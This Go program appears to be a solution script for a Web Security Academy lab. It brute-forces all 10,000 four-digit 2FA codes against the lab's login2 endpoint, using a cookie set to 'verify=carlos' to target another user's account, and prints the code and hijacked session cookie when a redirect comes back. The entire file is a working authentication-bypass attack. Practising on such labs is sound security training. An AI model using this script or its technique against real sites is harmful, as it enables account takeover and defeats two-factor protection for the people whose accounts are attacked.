package main

import (
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

func main() {
	csrfPtr := flag.String("csrf", "", "csrf token")
	sessionPtr := flag.String("session", "", "session token")
	hostPtr := flag.String("host", "", "lab host ID")

	flag.Parse()

	// Special client that doesnt follow redirects since the response we are looking for has status code 302
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: time.Second * 30,
	}

	guess2FACode(client, *csrfPtr, *sessionPtr, *hostPtr)
}

func guess2FACode(client *http.Client, csrfToken string, session string, hostID string) {
	permutations := generatePermutations()
	var wg sync.WaitGroup
	// Limit to only 10 goroutines at a time to prevent errors
	maxConnectionsChannel := make(chan bool, 10)
	for _, permutation := range permutations {
		wg.Add(1)
		maxConnectionsChannel <- true
		go func() {
			defer wg.Done()
			defer func(maxConnectionsChannel chan bool) { <-maxConnectionsChannel }(maxConnectionsChannel)
			body := url.Values{}
			body.Add("csrf", csrfToken)
			body.Add("mfa-code", permutation)

			req, err := http.NewRequest("POST", "https://"+hostID+".web-security-academy.net/login2", strings.NewReader(body.Encode()))
			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Add("Host", hostID+".web-security-academy.net")
			req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Add("Accept-Language", "en-US,en;q=0.5")
			req.Header.Add("Accept-Encoding", "gzip, deflate")
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Add("Connection", "close")
			req.Header.Add("Cookie", "session="+session+"; verify=carlos")

			resp, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
			resp.Body.Close()

			if resp.StatusCode == 302 {
				setCookie := resp.Header.Get("Set-Cookie")
				cookies := strings.Split(setCookie, ";")
				for _, cookie := range cookies {
					pair := strings.Split(cookie, "=")
					if pair[0] == "session" {
						fmt.Println("2FA code = " + permutation + " and session cookie = " + pair[1])
						break
					}
				}
			}
		}()
	}
	wg.Wait()
}

func generatePermutations() []string {
	permutations := []string{}
	for i := 0; i < 10000; i++ {
		permutations = append(permutations, fmt.Sprintf("%04d", i))
	}
	return permutations
}
